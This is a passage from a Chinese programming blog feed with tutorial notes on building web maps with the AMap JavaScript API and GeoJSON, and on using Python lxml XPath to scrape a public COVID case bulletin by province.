title="地图参数"></a>地图参数</h3><p><a href="https://lbs.amap.com/api/jsapi-v2/documentation#map">高德开放平台官网：https://lbs.amap.com/api/jsapi-v2/documentation#map</a></p><p><img src="/2022/10/24/GIS/gis-5.png"></p><div class="hljs code-wrapper"><pre><code>var map = new AMap.Map(&#39;map&#39;, &#123;      viewMode: &#39;3D&#39;,      center: [116.397083, 39.874531],      layers: [AMap.createDefaultLayer()],  // layers 字段为空或者不赋值将会自动创建默认底图。      zoom: 12,&#125;)</code></pre></div><h3 id="地图图层"><a href="#地图图层" class="headerlink" title="地图图层"></a>地图图层</h3><p><a href="https://lbs.amap.com/api/jsapi-v2/guide/layers/official-layers">高德开放平台官网：https://lbs.amap.com/api/jsapi-v2/guide/layers/official-layers</a></p><p><img src="/2022/10/24/GIS/gis-7.png"></p><h4 id="例–按钮—-gt-实时路况"><a href="#例–按钮—-gt-实时路况" class="headerlink" title="例–按钮—&gt;实时路况"></a>例–按钮—&gt;实时路况</h4><p><img src="/2022/10/24/GIS/gis-8.png"></p><div class="hljs code-wrapper"><pre><code>&lt;body&gt;    &lt;button onclick=&quot;add()&quot;&gt;显示实时路况&lt;/button&gt;    &lt;button onclick=&quot;remove()&quot;&gt;隐藏实时路况&lt;/button&gt;    &lt;!--创建地图容器--&gt;    &lt;div id=&quot;container&quot;&gt;&lt;/div&gt;    &lt;script&gt;        //定义一个变量，保存/加载对象        var map = new AMap.Map(&#39;container&#39;,&#123;            zoom: 10,  //设置地图显示的缩放级别            center: [116.397428, 39.90923],//设置地图中心点坐标            viewMode: &#39;2D&#39;,  //设置地图模式        &#125;);        var traffic = new AMap.TileLayer.Traffic(&#123;            &#39;autoRefresh&#39;: true,     //是否自动刷新，默认为false            &#39;interval&#39;: 180,         //刷新间隔，默认180s        &#125;);        //map.add(traffic); //通过add方法添加图层        //map.remove(traffic) //需要时可以移除        function add()        &#123;map.add(traffic)&#125;         function remove()        &#123;map.remove(traffic)&#125;    &lt;/script&gt;  &lt;/body&gt;</code></pre></div><h3 id="地图控件"><a href="#地图控件" class="headerlink" title="地图控件"></a>地图控件</h3><p><a href="https://lbs.amap.com/api/jsapi-v2/guide/overlays/toolbar">高德开放平台官网：https://lbs.amap.com/api/jsapi-v2/guide/overlays/toolbar</a></p><div class="hljs code-wrapper"><pre><code>    AMap.plugin([&#39;AMap.ToolBar&#39;,&#39;AMap.Scale&#39;,&#39;AMap.HawkEye&#39;,&#39;AMap.MapType&#39;,&#39;AMap.ControlBar&#39;],function()&#123;            //添加控件            //ToolBar(工具条) 集成了缩放，平移，定位            map.addControl(new AMap.ToolBar())            //Scale(比例尺) 展示地图在当前层级和经纬度下的比例            map.addControl(new AMap.Scale())            //HawkEye(鹰眼) 右下角显示地图的缩略图            map.addControl(new AMap.HawkEye())                        //MapType(切换图层)            map.addControl(new AMap.MapType())                        //ControlBar(工具条方向盘)            map.addControl(new AMap.ControlBar())        &#125;)</code></pre></div><p><img src="/2022/10/24/GIS/gis-9.png"></p><h3 id="地图事件"><a href="#地图事件" class="headerlink" title="地图事件"></a>地图事件</h3><p><a href="https://lbs.amap.com/api/jsapi-v2/guide/events/map_overlay">高德开放平台官网：https://lbs.amap.com/api/jsapi-v2/guide/events/map_overlay</a></p><h4 id="例-获取鼠标点击经纬度"><a href="#例-获取鼠标点击经纬度" class="headerlink" title="例 - 获取鼠标点击经纬度"></a>例 - 获取鼠标点击经纬度</h4><div class="hljs code-wrapper"><pre><code>// 监听地图的点击事件        map.on(&#39;click&#39;,function(event)&#123;            //控制台输出当前点击具体信息            console.log(event)            //输出经纬度            console.log(`经度：$&#123;event.lnglat.lng&#125;,纬度：$&#123;event.lnglat.lat&#125;`)        &#125;)</code></pre></div><p><img src="/2022/10/24/GIS/gis-10.png"></p><h3 id="点标记-Marker"><a href="#点标记-Marker" class="headerlink" title="点标记 Marker"></a>点标记 Marker</h3><p><a href="https://lbs.amap.com/api/jsapi-v2/guide/overlays/marker">高德开放平台官网：https://lbs.amap.com/api/jsapi-v2/guide/overlays/marker</a></p><h4 id="基于经纬度绘制点—"><a href="#基于经纬度绘制点—" class="headerlink" title="基于经纬度绘制点—"></a>基于经纬度绘制点—</h4><div class="hljs code-wrapper"><pre><code>         //基于经纬度绘制点        var marker = new AMap.Marker(&#123;            position: new AMap.LngLat(116.39, 39.9),   // 经纬度对象，也可以是经纬度构成的一维数组[116.39, 39.9]            title: &#39;北京&#39;        &#125;);        // 将创建的点标记添加到已有的地图实例：        map.add(marker);        // 移除已创建的 marker        //map.remove(marker);</code></pre></div><p>点图标无法正常显示，需附带本地路径+图片</p><div class="hljs code-wrapper"><pre><code>    offset: new AMap.Pixel(-10, -10), //相对点的偏移位置    icon: &#39;2.png&#39;, // 添加 Icon 图标 URL</code></pre></div><h4 id="交互式绘制点"><a href="#交互式绘制点" class="headerlink" title="交互式绘制点"></a>交互式绘制点</h4><div class="hljs code-wrapper"><pre><code>//交互式绘制点       map.on(&#39;click&#39;,function(event)&#123;            //控制台输出当前点击具体信息            console.log(event)            //输出经纬度            console.log(`经度：$&#123;event.lnglat.lng&#125;,纬度：$&#123;event.lnglat.lat&#125;`)            var marker = new AMap.Marker(&#123;            position: event.lnglat,   // 经纬度对象，也可以是经纬度构成的一维数组[116.39, 39.9]            offset: new AMap.Pixel(-10, -10),            icon: &#39;2.png&#39;, // 添加 Icon 图标 URL            title: &#39;北京&#39;        &#125;);        // 将创建的点标记添加到已有的地图实例：        map.add(marker);        &#125;)</code></pre></div><p>点图标无法正常显示，需附带本地路径+图片</p><h4 id="自定义Icon图标"><a href="#自定义Icon图标" class="headerlink" title="自定义Icon图标"></a>自定义Icon图标</h4><div class="hljs code-wrapper"><pre><code> icon: &#39;2.png&#39;, // 添加 Icon 图标 URLvar icon = new AMap.Icon(&#123;    size: new AMap.Size(40, 50),    // 图标尺寸    image: &#39;//webapi.amap.com/theme/v1.3/images/newpc/way_btn2.png&#39;,  // Icon的图像    imageOffset: new AMap.Pixel(0, -60),  // 图像相对展示区域的偏移量，适于雪碧图等    imageSize: new AMap.Size(40, 50)   // 根据所设置的大小拉伸或压缩图片&#125;);icon：icon</code></pre></div><h4 id="圆点标记—标注省会"><a href="#圆点标记—标注省会" class="headerlink" title="圆点标记—标注省会"></a>圆点标记—标注省会</h4><div class="hljs code-wrapper"><pre><code>  &lt;script type=&quot;text/javascript&quot; src=&#39;https://a.amap.com/jsapi_demos/static/resource/capitals.js&#39;&gt;&lt;/script&gt;for(var i=0;i&lt;capitals.length;i+=1)&#123;    var center = capitals[i].center;    var circleMarker = new AMap.CircleMarker(&#123;          center:center,          radius:10+Math.random()*10,//3D视图下，CircleMarker半径不要超过64px          strokeColor:&#39;white&#39;,          strokeWeight:2,          strokeOpacity:0.5,          fillColor:&#39;rgba(0,0,255,1)&#39;,          fillOpacity:0.5,          zIndex:10,          bubble:true,          cursor:&#39;pointer&#39;,          clickable: true        &#125;)    circleMarker.setMap(map)  &#125;</code></pre></div><h4 id="纯文本标记"><a href="#纯文本标记" class="headerlink" title="纯文本标记"></a>纯文本标记</h4><div class="hljs code-wrapper"><pre><code>&lt;!--纯文本标记--&gt;    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://a.amap.com/jsapi_demos/static/demo-center/css/demo-center.css&quot;/&gt;// 创建纯文本标记        var text = new AMap.Text(&#123;            text:&#39;111111&#39;,            anchor:&#39;center&#39;, // 设置文本标记锚点            draggable:true,            cursor:&#39;pointer&#39;,            angle:10,            style:&#123;                &#39;padding&#39;: &#39;.75rem 1.25rem&#39;,                &#39;margin-bottom&#39;: &#39;1rem&#39;,                &#39;border-radius&#39;: &#39;.25rem&#39;,                &#39;background-color&#39;: &#39;white&#39;,                &#39;width&#39;: &#39;15rem&#39;,                &#39;border-width&#39;: 0,                &#39;box-shadow&#39;: &#39;0 2px 6px 0 rgba(114, 124, 245, .5)&#39;,                &#39;text-align&#39;: &#39;center&#39;,                &#39;font-size&#39;: &#39;20px&#39;,                &#39;color&#39;: &#39;blue&#39;            &#125;,        position: [116.396923,39.918203]    &#125;);    text.setMap(map);</code></pre></div><h3 id="矢量图形"><a href="#矢量图形" class="headerlink" title="矢量图形"></a>矢量图形</h3><p><a href="https://lbs.amap.com/api/jsapi-v2/guide/overlays/vector-overlay">高德开放平台官网：https://lbs.amap.com/api/jsapi-v2/guide/overlays/vector-overlay</a></p><h4 id="折线-Polyline"><a href="#折线-Polyline" class="headerlink" title="折线 Polyline"></a>折线 Polyline</h4><div class="hljs code-wrapper"><pre><code>// 折线的节点坐标数组，每个元素为 AMap.LngLat 对象var path = [    new AMap.LngLat(116.368904,39.913423),    new AMap.LngLat(116.382122,39.901176),    new AMap.LngLat(116.387271,39.912501),    new AMap.LngLat(116.398258,39.904600)];// 创建折线实例var polyline = new AMap.Polyline(&#123;    path: path,      borderWeight: 2, // 线条宽度，默认为 1    strokeColor: &#39;red&#39;, // 线条颜色    lineJoin: &#39;round&#39; // 折线拐点连接处样式&#125;);// 将折线添加至地图实例map.add(polyline);</code></pre></div><h4 id="多边形-Polygon-、圆形-Circle-、矩形-Rectangle-、-椭圆形-Ellipse"><a href="#多边形-Polygon-、圆形-Circle-、矩形-Rectangle-、-椭圆形-Ellipse" class="headerlink" title="多边形 Polygon 、圆形 Circle 、矩形 Rectangle 、 椭圆形 Ellipse"></a>多边形 Polygon 、圆形 Circle 、矩形 Rectangle 、 椭圆形 Ellipse</h4><h3 id="几何计算"><a href="#几何计算" class="headerlink" title="几何计算"></a>几何计算</h3><h4 id="距离、长度、面积"><a href="#距离、长度、面积" class="headerlink" title="距离、长度、面积"></a>距离、长度、面积</h4><p><a href="https://lbs.amap.com/api/jsapi-v2/guide/geometry/geometry">高德开放平台官网：https://lbs.amap.com/api/jsapi-v2/guide/geometry/geometry</a></p><ul><li>计算两点间的实际距离 AMap.GeometryUtil.distance</li><li>计算点到线段的最短距离 AMap.GeometryUtil.distanceToSegment</li><li>计算点到路径的最短距离  AMap.GeometryUtil.distanceToLine</li><li>计算路径的实际长度 AMap.GeometryUtil.distanceOfLine</li><li>计算封闭区域的面积 AMap.GeometryUtil.ringArea</li></ul><h4 id="计算两点间的实际距离"><a href="#计算两点间的实际距离" class="headerlink" title="计算两点间的实际距离"></a>计算两点间的实际距离</h4><p>当需要计算两个地理位置间的实际地面距离时，可以使用静态方法 AMap.GeometryUtil.distance，返回数据以米为单位</p><div class="hljs code-wrapper"><pre><code>var p1 = [116.434027, 39.941037];var p2 = [116.461665, 39.941564];// 返回 p1 到 p2 间的地面距离，单位：米var dis = AMap.GeometryUtil.distance(p1, p2);</code></pre></div><h4 id="可移动两点的直线距离"><a href="#可移动两点的直线距离" class="headerlink" title="可移动两点的直线距离"></a>可移动两点的直线距离</h4><ol><li>创建两个点，设置可以拖动</li><li>准备一条线段</li><li>准备一个文本</li><li>计算</li></ol><p>(定位点—武汉)</p><div class="hljs code-wrapper"><pre><code>    // 可移动两点的直线距离       //1. 创建两个点，设置可以拖动       var m1= new AMap.Marker(&#123;        map:map,        //将m1这个点添加到AMap中        draggable:true, //设置该点可以拖动        position:new AMap.LngLat(114.255,30.621),        icon: &#39;2.png&#39;, // 添加 Icon 图标 URL       &#125;)       var m2= new AMap.Marker(&#123;        map:map,        //将m1这个点添加到AMap中        draggable:true, //设置该点可以拖动        position:new AMap.LngLat(114.334,30.579),        icon: &#39;2.png&#39;, // 添加 Icon 图标 URL       &#125;)       //让地图根据覆盖物调整地图显示区域       map.setFitView()       //2. 准备一条线段       var line= new AMap.Polyline(&#123;        strokeColor:&#39;#80d8ff&#39;,  //描边的颜色        isOutline:true,         //包含轮廓        outerlineColor:&#39;white&#39;  //轮廓颜色       &#125;)       line.setMap(map)       //3. 准备一个文本       var text = new AMap.Text(&#123;            text:&#39;&#39;,            style:&#123;                &#39;background-color&#39;:&#39;#29b6f6&#39;,                &#39;border-color&#39;:&#39;#e1f5fe&#39;,                &#39;font-size&#39;:&#39;16px&#39;,            &#125;,        &#125;)       text.setMap(map)          //4.计算       function compute()&#123;            //得到m1,m2的经纬度            var p1 = m1.getPosition()            var p2 = m2.getPosition()            //希望文本显示在两个经纬度的中间            //divideBy() 除法            var textPos = p1.divideBy(2).add(p2.divideBy(2))//(p1+p2)/2            //distance() 计算两点的直线距离            //Math.round() 取整            var distance = Math.round(p1.distance(p2))            //定义路径            var path = [p1,p2]            line.setPath(path)  //绘制线段，根据p1,p2的坐标            //为text填充值            text.setText(&#39;距离为&#39;+distance+&#39;米&#39;)            //设置文字的显示区域            text.setPosition(textPos)       &#125;       compute()       m1.on(&#39;dragging&#39;,compute)       m2.on(&#39;dragging&#39;,compute)</code></pre></div><h3 id="GeoJSON"><a href="#GeoJSON" class="headerlink" title="GeoJSON"></a>GeoJSON</h3><p><a href="https://geojson.org/">GEOJSON官网：https://geojson.org/</a></p><p>GeoJSON is a format for encoding a variety of geographic data structures.</p><h4 id="GeoJSON是一种用于编码各种地理数据结构的格式"><a href="#GeoJSON是一种用于编码各种地理数据结构的格式" class="headerlink" title="GeoJSON是一种用于编码各种地理数据结构的格式"></a>GeoJSON是一种用于编码各种地理数据结构的格式</h4><div class="hljs code-wrapper"><pre><code>&#123;      &quot;type&quot;: &quot;Feature&quot;,     //要素      &quot;geometry&quot;: &#123;        //几何信息     &quot;type&quot;: &quot;Point&quot;,    //包括点、线、多边形、多个点、多条线和多个边形       &quot;coordinates&quot;: [125.6, 10.1]     //经纬度坐标点      &#125;,      &quot;properties&quot;: &#123;        //自定义属性信息        &quot;name&quot;: &quot;Dinagat Islands&quot;          &#125;&#125;</code></pre></div><h4 id="数据的持久化"><a href="#数据的持久化" class="headerlink" title="数据的持久化"></a>数据的持久化</h4><h4 id="持久化的方式"><a href="#持久化的方式" class="headerlink" title="持久化的方式"></a>持久化的方式</h4><p>使用GDB数据库，将数据保存在地理数据库中</p><p>使用GeoJSON，将数据保存到GeoJSON格式的文件中</p><h3 id="GeoJSON-封装数据读写函数"><a href="#GeoJSON-封装数据读写函数" class="headerlink" title="GeoJSON- 封装数据读写函数"></a>GeoJSON- 封装数据读写函数</h3><div class="hljs code-wrapper"><pre><code>----------&gt;getdata.js//从localStorage读取数据 function getData()&#123;    //如果本地localStorage不存在数据    if(!localStorage.getItem(&#39;geojson&#39;))&#123;        localStorage.setItem(&#39;geojson&#39;,&#39;[]&#39;)    &#125;    else    &#123;return JSON.parse(localStorage.getItem(&#39;geojson&#39;))&#125;&#125;//将数据保存到localStorage中function saveData(data)&#123;    localStorage.setItem(&#39;geojson&#39;,JSON.stringify(data))&#125;&lt;script src=&quot;getdata.js&quot;&gt;&lt;/script&gt; </code></pre></div><h3 id="GeoJSON-数据持久化实现"><a href="#GeoJSON-数据持久化实现" class="headerlink" title="GeoJSON - 数据持久化实现"></a>GeoJSON - 数据持久化实现</h3><div class="hljs code-wrapper"><pre><code>//在加载配置中的plugins插件中添加&#39;AMap.GeoJSON&#39;才能够使用。（官方文档好像并没有说明，可能也是我没看到）    AMap.plugin([&#39;AMap.GeoJSON&#39;,],function()&#123;&#125;)    //定义一个全局变量，用于保存GeoJSON    var geojson = new AMap.GeoJSON(&#123;        geoJSON:null,    &#125;)    //本地不为空，导入数据    if(JSON.stringify(getData())!=&#39;[]&#39;)&#123;        //导入数据/显示/添加在地图上        geojson.importData(getData())    &#125;    map.add(geojson)    //动态绘制点(动态数据更新)    map.on(&#39;click&#39;,function(event)&#123;            var marker = new AMap.Marker(&#123;            position: event.lnglat,   // 经纬度对象，也可以是经纬度构成的一维数组[116.39, 39.9]            offset: new AMap.Pixel(-10, -10),            icon:&#39;2.png&#39;,        &#125;);        //通过geojson对象来管理覆盖物        geojson.addOverlay(marker)        //保存数据(将geojson对象转换成标准GeoJSON数据)        saveData(geojson.toGeoJSON())        console.log(geojson)    &#125;)    console.log(geojson)</code></pre></div><h3 id="GeoJSON-新旧数据的点击事件"><a href="#GeoJSON-新旧数据的点击事件" class="headerlink" title="GeoJSON - 新旧数据的点击事件"></a>GeoJSON - 新旧数据的点击事件</h3><div class="hljs code-wrapper"><pre><code> //使用新创建的覆盖物的点击事件     //动态数据    map.on(&#39;click&#39;,function(event)&#123;            var marker = new AMap.Marker(&#123;            position: event.lnglat,   // 经纬度对象，也可以是经纬度构成的一维数组[116.39, 39.9]            offset: new AMap.Pixel(-10, -10),            icon:&#39;2.png&#39;,        &#125;);        //使用新创建的覆盖物的点击事件        marker.on(&#39;click&#39;,function(e)&#123;            console.log(e.lnglat,&#39;点击了&#39;)        &#125;)            //通过geojson对象来管理覆盖物        geojson.addOverlay(marker)        //保存数据(将geojson对象转换成标准GeoJSON数据)        saveData(geojson.toGeoJSON())        console.log(geojson)    &#125;)//恢复旧数据的点击事件    //本地不为空，导入数据    if(JSON.stringify(getData())!=&#39;[]&#39;)&#123;        //导入数据/显示/添加在地图上        geojson.importData(getData())        //恢复旧数据的点击事件---eachOverlay() 得到geojson中的每一个点        geojson.eachOverlay(function(item)&#123;            item.on(&#39;click&#39;,function(e)&#123;                console.log(e.lnglat,&#39;旧的数据点击了&#39;)            &#125;)        &#125;)    &#125;</code></pre></div><h3 id="GeoJSON-自定义属性的使用"><a href="#GeoJSON-自定义属性的使用" class="headerlink" title="GeoJSON - 自定义属性的使用"></a>GeoJSON - 自定义属性的使用</h3><div class="hljs code-wrapper"><pre><code>    //自定义属性            extData:&#123;                _geoJsonProperties:&#123;                    //gid 点的唯一标识                    gid:geojson.getOverlays().length+1,                    //click 点击次数                    click:0,                &#125;            &#125;</code></pre></div><p>getExtData<br>ext._geoJsonProperties.属性</p><div class="hljs code-wrapper"><pre><code>         //使用新创建的覆盖物的点击事件        marker.on(&#39;click&#39;,function(e)&#123;            console.log(e.lnglat,&#39;点击了&#39;)            //让点击的marker对象的click属性+1            var ext=marker.getExtData()            ext._geoJsonProperties.click=ext._geoJsonProperties.click+1            var click = ext._geoJsonProperties.click            console.log(&#39;点击了&#39;+click+&#39;次&#39;)            saveData(geojson.toGeoJSON())        &#125;)</code></pre></div><h3 id="GeoJSON-点击后的消息提示"><a href="#GeoJSON-点击后的消息提示" class="headerlink" title="GeoJSON - 点击后的消息提示"></a>GeoJSON - 点击后的消息提示</h3><div class="hljs code-wrapper"><pre><code>    //使用新创建的覆盖物的点击事件        marker.on(&#39;click&#39;,function(e)&#123;            console.log(e.lnglat,&#39;点击了&#39;)            //让点击的marker对象的click属性+1            var ext=marker.getExtData()            ext._geoJsonProperties.click=ext._geoJsonProperties.click+1            var click = ext._geoJsonProperties.click            console.log(&#39;点击了&#39;+click+&#39;次&#39;)            //使用消息提示框显示            var infowindow = new AMap.InfoWindow(&#123;                anchor:&#39;top-center&#39;,                content:`&lt;div&gt;打卡了$&#123;click&#125;次&lt;/div&gt;`            &#125;)            //显示(打开信息窗口)            infowindow.open(map,marker.getPosition())                        saveData(geojson.toGeoJSON())        &#125;)</code></pre></div><h3 id="GeoJSON-路径规划"><a href="#GeoJSON-路径规划" class="headerlink" title="GeoJSON - 路径规划"></a>GeoJSON - 路径规划</h3><div class="hljs code-wrapper"><pre><code>&lt;div class=&quot;input-card&quot;&gt;    &lt;h4&gt;推荐浏览路线&lt;/h4&gt;    &lt;div class=&quot;input-item&quot;&gt;        &lt;button class=&quot;btn&quot; onclick=startDH()&gt;开始动画&lt;/button&gt;    &lt;/div&gt;&lt;/div&gt;function startDH()&#123;        console.log(&quot;开始动画&quot;)        //实现路径规划        AMap.plugin(&#39;AMap.Driving&#39;,function()&#123;            var Driving= new AMap.Driving(&#123;                map:map,                //驾车的路径规划策略---官方文档                policy:AMap.DrivingPolicy.LEAST_TIME,            &#125;)            //设置起点和终点            var start = new AMap.LngLat(106.5620,29.5626)            var end = new AMap.LngLat(121.516043,31.217199)            //绘制路线            Driving.search(start,end,function(status,res)&#123;                if(status==&#39;complete&#39;)&#123;                    console.log(&#39;ok&#39;)                &#125;                else console.log(&#39;nonono &#39;)            &#125;)        &#125;)    &#125;</code></pre></div><h3 id="GeoJSON-实现路径途径点"><a href="#GeoJSON-实现路径途径点" class="headerlink" title="GeoJSON - 实现路径途径点"></a>GeoJSON - 实现路径途径点</h3><div class="hljs code-wrapper"><pre><code>//通过geojson得到每一个点的坐标            var opts = &#123;                waypoints:[]            &#125;            geojson.eachOverlay(function(item)&#123;                opts.waypoints.push(item.getPosition())            &#125;)//绘制路线            Driving.search(start,end,opts,function(status,res)&#123;</code></pre></div><h3 id="GeoJSON-轨迹模拟动画"><a href="#GeoJSON-轨迹模拟动画" class="headerlink" title="GeoJSON - 轨迹模拟动画"></a>GeoJSON - 轨迹模拟动画</h3><div class="hljs code-wrapper"><pre><code>//动画插件    AMap.plugin([&#39;AMap.MoveAnimation&#39;,],function()&#123;&#125;)function startDH()&#123;        console.log(&quot;开始动画&quot;)        //实现路径规划        AMap.plugin(&#39;AMap.Driving&#39;,function()&#123;            var Driving= new AMap.Driving(&#123;                map:map,                //驾车的路径规划策略                policy:AMap.DrivingPolicy.LEAST_TIME,            &#125;)            //设置起点和终点            var start = new AMap.LngLat(106.5620,29.5626)            var end = new AMap.LngLat(121.516043,31.217199)            //通过geojson得到每一个点的坐标            var opts = &#123;                waypoints:[]            &#125;            geojson.eachOverlay(function(item)&#123;                opts.waypoints.push(item.getPosition())            &#125;)            //绘制路线            Driving.search(start,end,opts,function(status,res)&#123;                if(status==&#39;complete&#39;)&#123;                    //实现轨迹模拟                                        //小车标记                    var marker = new AMap.Marker(&#123;                        map:map,                        position:start,                        icon:&#39;1.png&#39;,                        offset:new AMap.Pixel(-26,-13),                        //自动调转车头                        autoRotation:true,                        angle:-180,                    &#125;)                     //模拟已过路径                    var passedPolyline = new AMap.Polyline(&#123;                        map:map,                        strokeColor:&quot;#AF5&quot;, //线的颜色                        strokeWeight:6,     //线宽度                    &#125;)                                        //线经过的路径---当点移动时，使用passedPolyline函数                    marker.on(&#39;moving&#39;,function(e)&#123;                        passedPolyline.setPath(e.passedPath)                    &#125;)                    //地图合适的显示效果                    map.setFitView()                    var lineArr=[]                    //........item.path 所需要经过的路径                    res.routes[0].steps.forEach(function(item)&#123;                        lineArr.push(...item.path)                    &#125;)                                        //每隔一段时间移动---lineArr 所经过的路径                    marker.moveAlong(lineArr,&#123;                        duration:500,       //更新界面的时间                        autoRoatation:true, //车头的方向                    &#125;)                &#125;                else console.log(&#39;nonono &#39;)            &#125;)        &#125;)    &#125;</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>web GIS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python-XPath</title>
    <link href="/2022/09/14/Python-XPath/"/>
    <url>/2022/09/14/Python-XPath/</url>
    
    <content type="html"><![CDATA[<p>XPath是一门在 XML 文档中查找信息的语言</p><span id="more"></span><h2 id="Python-XPath"><a href="#Python-XPath" class="headerlink" title="Python-XPath"></a>Python-XPath</h2><h3 id="1、什么是xpath"><a href="#1、什么是xpath" class="headerlink" title="1、什么是xpath"></a>1、什么是xpath</h3><p>XPath 使用路径表达式在 XML 文档中进行导航<br>XPath 包含一个标准函数库<br>XPath 是 XSLT 中的主要元素<br>XPath 是一个 W3C 标准  </p><p>其实XPath就是一门在 XML 文档中查找信息的语言。XPath用于在 XML 文档中通过元素和属性进行导航。</p><h3 id="2、安装"><a href="#2、安装" class="headerlink" title="2、安装"></a>2、安装</h3><div class="hljs code-wrapper"><pre><code>pip install lxml</code></pre></div><h3 id="3、xpath语法"><a href="#3、xpath语法" class="headerlink" title="3、xpath语法"></a>3、xpath语法</h3><h4 id="3-1、选取节点"><a href="#3-1、选取节点" class="headerlink" title="3.1、选取节点"></a>3.1、选取节点</h4><p>XPath使用路径表达式在XML文档种选取节点。  </p><p>节点包括元素，属性，和内容</p><div class="hljs code-wrapper"><pre><code>html ---&gt; &lt;html&gt; ...&lt;/html&gt;div ---&gt; &lt;div&gt; ...&lt;/div&gt;a  ---&gt; &lt;a&gt; ...&lt;/a&gt;</code></pre></div><p>这里的元素和html中的标签一个意思。单独的元素是无法表达一个路径的，所以单独的元素不能独立使用</p><p>节点是通过沿着路径或者step来选取的</p><div class="hljs code-wrapper"><pre><code>/   根节点，节点分隔符，//  任意位置.   当前节点..  父级节点@   属性</code></pre></div><p>谓语</p><div class="hljs code-wrapper"><pre><code>//a[n] n为大于零的整数，代表子元素排在第n个位置的&lt;a&gt;元素//a[last()]   last()  代表子元素排在最后个位置的&lt;a&gt;元素//a[last()-]  和上面同理，代表倒数第二个//a[position()&lt;3] 位置序号小于3，也就是前两个，这里我们可以看出xpath中的序列是从1开始//a[@href]    拥有href的&lt;a&gt;元素//a[@href=&#39;www.baidu.com&#39;]    href属性值为&#39;www.baidu.com&#39;的&lt;a&gt;元素//book[@price&gt;2]   price值大于2的&lt;book&gt;元素</code></pre></div><h3 id="etree-HTML-html"><a href="#etree-HTML-html" class="headerlink" title="etree.HTML(html)"></a>etree.HTML(html)</h3><div class="hljs code-wrapper"><pre><code>from lxml import etree # 报红忽略url=...html=requests.get(html).decode(&#39;utf-8&#39;)etree.HTML(html)</code></pre></div><h3 id="xpath-函数"><a href="#xpath-函数" class="headerlink" title="xpath 函数"></a>xpath 函数</h3><h4 id="text"><a href="#text" class="headerlink" title="text()"></a>text()</h4><p>输出文本</p><h4 id="string"><a href="#string" class="headerlink" title="string()"></a>string()</h4><p>string()会把当前节点和所有的子孙节点中的文本全部提取出来，组合成一个字符串</p><div class="hljs code-wrapper"><pre><code>code3 = code2.xpath(&#39;string(//div[@class=&quot;con&quot;])&#39;)# 将类名为con的div中的所有文本提取</code></pre></div><p><a href="https://www.w3school.com.cn/xpath/xpath_functions.asp">https://www.w3school.com.cn/xpath/xpath_functions.asp</a></p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><div class="hljs code-wrapper"><pre><code>&lt;ul class=&quot;zxxx_list&quot;&gt;    &lt;li&gt;  &lt;a href=&quot;7c34a65595744227bdae8a35d68de133.shtml&quot; target=&quot;_blank&quot; title=&#39;截至9月13日24时&#39;  &gt;截至9月13日24时&lt;/a&gt;&lt;span class=&quot;ml&quot;&gt;2022-09-14&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;</code></pre></div><hr><div class="hljs code-wrapper"><pre><code>#!/usr/bin/python# coding=utf-8from lxml import htmlfrom lxml import etreeimport requestsurl=&#39;&#39;a = requests.session()          # session建立连接html1 = a.get(url).content.decode(&#39;utf-8&#39;)print(html1)html2=etree.HTML(html1,parser = etree.HTMLParser(encoding=&#39;utf8&#39;))print(html2.xpath(&#39;//ul[@class=&quot;zxxx_list&quot;]/li/a/@href&#39;)[0])# 查找类名为zxxx_list的ul 向下查找li/a 获取a的href 获取第一项</code></pre></div><p>===&gt;</p><div class="hljs code-wrapper"><pre><code>7c34a65595744227bdae8a35d68de133.shtml</code></pre></div><p>参考：<br><a href="https://www.cnblogs.com/mxjhaima/p/13775844.html">https://www.cnblogs.com/mxjhaima/p/13775844.html</a></p><p>语法参考：<br><a href="https://blog.csdn.net/qq_50854790/article/details/123610184">https://blog.csdn.net/qq_50854790/article/details/123610184</a></p><hr><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><div class="hljs code-wrapper"><pre><code>#!/usr/bin/python# coding=utf-8from lxml import etreeimport requestsurl = &#39;http://www.nhc.gov.cn&#39;url1 = &#39;http://www.nhc.gov.cn/xcs/yqtb/list_gzbd.shtml&#39;# region 一、访问目标界面，获取动态更新网址a = requests.session()  # session建立连接html0 = a.get(url1)html0.encoding = &#39;utf-8&#39;html1 = html0.content.decode(&#39;utf-8&#39;)# print(html1)html2 = etree.HTML(html1, parser=etree.HTMLParser(encoding=&#39;utf8&#39;))html3 = html2.xpath(&#39;//ul[@class=&quot;zxxx_list&quot;]/li/a/@href&#39;)[0]# print(html3)a.close()url2 = url + html3print(url2)# endregion# region 二、从动态网页上获取所需信息b = requests.session()res1 = b.get(url2)res1.encoding = &#39;utf-8&#39;code1 = res1.textprint(code1)b.close()code2 = etree.HTML(code1, parser=etree.HTMLParser(encoding=&#39;utf8&#39;))code3 = code2.xpath(&#39;string(//div[@class=&quot;con&quot;])&#39;)# print(code3)# endregion# region 三、处理数据s1 = code3.find(&#39;。&#39;) + 1s2 = code3.find(&#39;死亡&#39;)code4 = code3[s1:s2]  # 处理数据，找到第一段print(code4)str = code4dict = &#123;&#39;北京&#39;: 0, &#39;天津&#39;: 0, &#39;上海&#39;: 0, &#39;重庆&#39;: 0, &#39;河北&#39;: 0, &#39;山西&#39;: 0, &#39;辽宁&#39;: 0, &#39;吉林&#39;: 0, &#39;江苏&#39;: 0, &#39;浙江&#39;: 0,    &#39;安徽&#39;: 0, &#39;福建&#39;: 0, &#39;江西&#39;: 0, &#39;山东&#39;: 0, &#39;河南&#39;: 0, &#39;湖北&#39;: 0, &#39;湖南&#39;: 0, &#39;广东&#39;: 0, &#39;海南&#39;: 0, &#39;四川&#39;: 0,    &#39;贵州&#39;: 0, &#39;云南&#39;: 0, &#39;陕西&#39;: 0, &#39;甘肃&#39;: 0, &#39;青海&#39;: 0, &#39;台湾&#39;: 0, &#39;广西&#39;: 0, &#39;西藏&#39;: 0, &#39;宁夏&#39;: 0, &#39;新疆&#39;: 0,    &#39;香港&#39;: 0, &#39;澳门&#39;: 0, &#39;黑龙江&#39;: 0, &#39;内蒙古&#39;: 0&#125;sum = str.count(&#39;（&#39;)  # 处理数据print(sum)str1 = &#39;&#39;for i in range(0, sum):    num1 = str.find(&#39;（&#39;)    num2 = str.find(&#39;）&#39;)    str1 = str1 + str[num1 + 1:num2].replace(&#39;例&#39;, &#39;&#39;)    if i &lt; sum - 1:        str1 = str1 + &#39;，&#39;    str = str[num2 + 1:]# print(str1)str2 = 